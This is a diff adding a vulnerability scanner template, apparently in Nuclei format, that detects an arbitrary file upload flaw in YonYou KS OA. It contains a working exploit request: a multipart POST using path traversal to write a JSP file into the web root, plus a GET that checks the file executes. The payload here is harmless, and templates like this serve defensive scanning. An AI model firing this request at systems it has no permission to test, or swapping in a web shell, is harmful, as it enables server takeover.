@@ -1,0 +1,50 @@
+id: yonyou-ksoa-arbitrary-file-upload
+
+info:
+  name: YonYou KS OA Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    YonYou KS OA has an arbitrary file upload vulnerability that allows attackers to upload arbitrary files, obtain webshells, control server permissions, and read sensitive information.
+  tags: file-upload
+
+variables:
+  rand: "{{rand_base(6)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    raw:
+      - |
+        POST /servlet/com.sksoft.v8.desktop.UploadImage?fileextr=.jsp&rpath=../webapps/ROOT/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=boundary123
+
+        --boundary123
+        Content-Disposition: form-data; name="file"; filename="{{rand}}.jsp"
+        Content-Type: text/plain
+
+        <%out.print("{{rand}}");%>
+        --boundary123--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ".jsp"
+
+  - id: verify-upload
+    raw:
+      - |
+        GET /{{rand}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{rand}}"
+      - type: status
+        status:
+          - 200
